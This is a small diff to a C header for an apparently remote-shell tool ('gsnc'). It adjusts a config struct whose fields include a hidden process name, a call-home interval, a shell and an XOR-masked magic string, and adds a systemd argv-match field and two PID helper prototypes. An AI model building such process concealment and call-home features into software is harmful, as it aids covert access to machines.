@@ -6,7 +6,6 @@
 struct gsnc_config {
     char host[128];
     char proc_hiddenname[64];
-    // char prg_exename[128];
     uint16_t port;
     int callhome_min;
     uint32_t flags;
@@ -14,6 +13,7 @@ struct gsnc_config {
     char shell[64];
     char domain[64];
     char workdir[64];
+    char systemd_argv_match[64];
     char magic[sizeof GSNC_CONFIG_MAGIC_STR - 1];    // GSNC_MAGIC_STR ^ GSNC_MAGIC_XOR
 };
 
@@ -21,5 +21,7 @@ int GSNC_config_read(const char *file);
 int GSNC_config_write(const char *file);
 void init_supervise(int *argc, char *argv[]);
 void sv_sigforward(int sig);
+pid_t forward_pid(void);
+void do_util_ffpid(void);
 
 #endif // __GSNC_GSNC_UTILS_H__
